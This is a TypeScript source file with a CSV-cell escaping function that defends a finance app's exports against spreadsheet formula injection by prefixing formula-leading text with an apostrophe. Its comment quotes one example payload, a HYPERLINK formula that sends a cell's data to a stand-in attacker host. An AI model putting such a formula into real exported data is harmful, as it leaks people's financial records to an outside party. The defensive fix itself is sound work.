/**
 * One CSV cell, safe to open in a spreadsheet.
 *
 * SECURITY-OPS-20 · Three writers (the query/report CSV, the transactions
 * export and the portfolio CSVs) each escaped only commas, quotes and
 * newlines. The text they write is not all ours: a payee and a narration come
 * from a bank statement or an alert email, written by whoever sent it. A cell
 * beginning with `=`, `+`, `-` or `@` is a formula to Excel and Sheets, so a
 * narration of `=HYPERLINK("http://attacker.example/?d="&A1,"Refund")` became a
 * live link that carried the row out of the household the moment the file was
 * opened. Tab and carriage return lead the same way on some importers.
 *
 * Such text gets a leading apostrophe, the spreadsheet convention for "this is
 * text": the cell shows what was written and never runs it. A plain number is
 * left alone — `-1250.5` is an amount, not a formula, and quoting it would turn
 * every debit column into text nobody can sum.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^[-+]?\d+(\.\d+)?$/;

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";
  let text = String(value);
  if (FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text)) text = `'${text}`;
  return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}
